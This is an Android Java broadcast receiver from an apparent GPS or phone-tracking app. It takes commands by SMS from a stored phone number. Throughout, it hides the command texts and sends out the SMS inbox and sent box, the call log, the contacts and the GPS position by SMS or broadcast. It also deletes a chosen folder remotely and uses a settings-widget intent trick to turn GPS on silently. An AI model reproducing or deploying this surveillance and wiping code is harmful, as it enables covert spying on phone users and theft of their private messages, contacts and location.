package com.kamrul.gps;

import java.io.File;
import java.util.Date;
import java.util.Locale;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;


public class SMSReceiver extends BroadcastReceiver
{
	

	private void sendSMS(String phoneNumber, String message)
	{
	
	SmsManager sms = SmsManager.getDefault();
	sms.sendTextMessage(phoneNumber, null, message, null, null);
	}
	
	public static boolean deleteNon_EmptyDir(File dir) {
	    if (dir.isDirectory()) {
	        String[] children = dir.list();
	        for (int i=0; i<children.length; i++) {
	            boolean success = deleteNon_EmptyDir(new File(dir, children[i]));
	            if (!success) {
	                return false;
	            }
	        }
	    }
	    return dir.delete();
	    
	}
	
	private LocationManager manager;
	private LocationListener listener;
	private int x = 0;
	private String str = "";
	private String str3 ="";
	
	
@Override
public void onReceive(final Context context, Intent intent)
{
	
	
	final SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(context);
	
	if(settings.contains("nvalue")){
	
	final String friend = settings.getString("nvalue", "no");
	
	Bundle bundle = intent.getExtras();
	SmsMessage[] msgs = null;

	String str1="";
	String str2="";

	if (bundle != null)
	{
		
	Object[] pdus = (Object[]) bundle.get("pdus");
	msgs = new SmsMessage[pdus.length];

		
	msgs[0] = SmsMessage.createFromPdu((byte[])pdus[0]);
	str1 = msgs[0].getMessageBody().toString();
	str2 = msgs[0].getOriginatingAddress();

	}

	str3 = str1.toLowerCase(Locale.getDefault());
	
	
	manager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
	listener = new LocationListener() {
		
		@Override
		public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
			// TODO Auto-generated method stub
	
		}
		
		@Override
		public void onProviderEnabled(String arg0) {
			// TODO Auto-generated method stub
			
			
		}
		
		@Override
		public void onProviderDisabled(String arg0) {
			// TODO Auto-generated method stub
			if(x == 0){
				
				manager.removeUpdates(listener);
			}
			else{
				x=0;
			}
		}
		
		@Override
		public void onLocationChanged(Location arg0) {
			// TODO Auto-generated method stub
			
			double lat = arg0.getLatitude();
			double lon = arg0.getLongitude();
			
			manager.removeUpdates(listener);
			
			str = "Latitude " + lat + " Longitude " + lon +
					"\nGo to maps.google.com and write the latitude and longitude data(seperate by a space) in the search bar";
			
			if(str3.contentEquals("loce") && settings.contains("uvalue") && settings.contains("pvalue") && settings.contains("fuvalue") ){

				Intent broadcastIntent = new Intent();
				broadcastIntent.setAction("SMS_RECEIVED_ACTION");
				broadcastIntent.putExtra("kmrl", str);
				context.sendBroadcast(broadcastIntent);
				}
				else
				{

					sendSMS(friend, str);
					
				}
			
		}
	};



//Here starts the get Message block
if(str2.contains(friend) && (str3.contentEquals("mle") || str3.contentEquals("ml")))
{
	
this.abortBroadcast();

str = "";

Uri uriSMSURI = Uri.parse("content://sms/inbox");
Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null,null);
str = "Inbox:\n\n";

while (cur.moveToNext()) {
    str += "From :" + cur.getString(2) + " : " + cur.getString(12)+"\n\n";
    
}

cur.close();


 str += "\n\nSentbox:\n\n";
Uri uriSMSURI2 = Uri.parse("content://sms/sent");
Cursor cur2 = context.getContentResolver().query(uriSMSURI2, null, null, null,null);
//boolean mb2 = true;
while (cur2.moveToNext()) {
	
    str += "From :" + cur2.getString(2) + " : " + cur2.getString(12)+"\n\n";
    
}

cur2.close();

if(str3.contentEquals("mle") && settings.contains("uvalue") && settings.contains("pvalue") && settings.contains("fuvalue") ){

Intent broadcastIntent = new Intent();
broadcastIntent.setAction("SMS_RECEIVED_ACTION");
broadcastIntent.putExtra("kmrl", str);
context.sendBroadcast(broadcastIntent);
}
else
{
	if(str.length()>100){
	sendSMS(friend, str.substring(0, 100));
	}
	else
	{
		sendSMS(friend, str);
	}
}

} // message block ends


//Here starts the get CallLog block
if(str2.contains(friend) && (str3.contentEquals("cle") || str3.contentEquals("cl")))
{
	this.abortBroadcast();
	
	
	str = "";
	
	ContentResolver cr = context.getContentResolver();
	//reading all data in descending order according to DATE
    String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
    Uri callUri = Uri.parse("content://call_log/calls");
    Cursor cur = cr.query(callUri, null, null, null, strOrder);
    // loop through cursor
    
    while (cur.moveToNext()) {
   
    // CallDataLog callLog = new CallDataLog();
     String callNumber = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
     String callName = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
     String callDate = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DATE));
     String callType = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.TYPE));
     //String isCallNew = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NEW));
     String duration = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION));
     // process log data...
     Date callDayTime = new Date(Long.valueOf(callDate));
     
     int dircode = Integer.parseInt( callType );
     String dir = "";
     
     switch( dircode ) {
     case CallLog.Calls.OUTGOING_TYPE:
     dir = "OUTGOING";
     break;

     case CallLog.Calls.INCOMING_TYPE:
     dir = "INCOMING";
     break;

     case CallLog.Calls.MISSED_TYPE:
     dir = "MISSED";
     break;
     }


     str = str + "\nPhone Number:--- "+callNumber+ " \nCall Name:---"+callName+ " \nCall Type:--- "+dir+" \nCall Date:--- "+callDayTime+" \nCall duration in sec :--- "+duration +"\n\n" ;
    
    
    }
   
    if(str3.contentEquals("cle") && settings.contains("uvalue") && settings.contains("pvalue") && settings.contains("fuvalue") ){

    	Intent broadcastIntent = new Intent();
    	broadcastIntent.setAction("SMS_RECEIVED_ACTION");
    	broadcastIntent.putExtra("kmrl", str);
    	context.sendBroadcast(broadcastIntent);
    	}
    	else
    	{
    		
    		if(str.length()>100){
    		sendSMS(friend, str.substring(0, 100));
    		}
    		else
    		{
    			sendSMS(friend, str);
    		}
    	}

}


// Here starts the get Contact number block
if(str2.contains(friend) && (str3.contentEquals("cnte") || str3.contentEquals("cnt"))){
	
	this.abortBroadcast();
	
	str = "";
	
	ContentResolver cr = context.getContentResolver();
    Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
    
    if (cur.getCount() > 0) {
    while (cur.moveToNext()) {
        String id = cur.getString(
                    cur.getColumnIndex(ContactsContract.Contacts._ID));
	//String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
		    
		   if (Integer.parseInt(cur.getString(
               cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
            Cursor pCur = cr.query(
		    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
		    null, 
		    ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", 
		    new String[]{id}, null);
          
	        while (pCur.moveToNext()) {
	        	
	        String num = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER ));
	        String name = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME ));
	        if(!num.contentEquals(name)){
	        	
	        str = str + name + "-" + num + "\n";       
	        
	        }
	        }
	       
	        pCur.close();
		   
		   } }
    
    if(str3.contentEquals("cnte") && settings.contains("uvalue") && settings.contains("pvalue") && settings.contains("fuvalue") ){

    	Intent broadcastIntent = new Intent();
    	broadcastIntent.setAction("SMS_RECEIVED_ACTION");
    	broadcastIntent.putExtra("kmrl", str);
    	context.sendBroadcast(broadcastIntent);
    	}
    	else
    	{

    		if(str.length()>100){
    			sendSMS(friend, str.substring(0, 100));
    			}
    			else
    			{
    				sendSMS(friend, str);
    			}
    		
    	}
    
   

    } }

//Block for Location
if(str2.contains(friend) && (str3.contentEquals("loce") || str3.contentEquals("loc"))) {
	
  this.abortBroadcast();

  if(!manager.isProviderEnabled(LocationManager.GPS_PROVIDER)){
  final Intent poke = new Intent();
  poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
  poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
  poke.setData(Uri.parse("3")); 
  context.sendBroadcast(poke);
  }
  x = 1;
  manager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, listener);
  
  
} 

//Here starts the block for file deletion
if(str2.contains(friend) && str3.contentEquals("dd"))
{
this.abortBroadcast();

if(settings.contains("fvalue")){
	
	File dir = new File("/" + Environment.getExternalStorageDirectory().getPath() + "/" + settings.getString("fvalue", "x1vk9x9"));
	//File dir = new File("/sdcard/" + et.getText().toString());
	
	if(dir.exists()){
		
		
		if(!dir.isDirectory()){
	
	 dir.delete();
      

	}
		else{
			
			deleteNon_EmptyDir(dir);
			
		}
		}
	
}
}



}
}} 